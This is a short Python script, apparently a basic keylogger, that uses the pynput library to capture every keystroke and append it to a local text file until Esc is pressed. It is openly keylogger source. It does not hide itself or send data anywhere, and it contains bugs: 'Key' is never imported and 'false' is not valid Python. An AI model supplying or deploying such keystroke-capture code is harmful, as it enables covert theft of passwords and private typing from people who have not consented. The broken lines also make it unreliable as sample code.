from pynput.keyboard import Listener
def log_keystroke_to_file(key):
    key = str(key).replace("'","")
    #we can store the key however we want (into the fie)
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if key == "Key.backspace":
        key = '(BSpace)'
        
    with open("key_loger_output.txt",'a') as f:
        f.write(key)
        
def on_release_exit_when_esc(key):
    if key == Key.esc:
        return false
    
with Listener(on_press = log_keystroke_to_file, on_release = on_release_exit_when_esc) as l:
    l.join()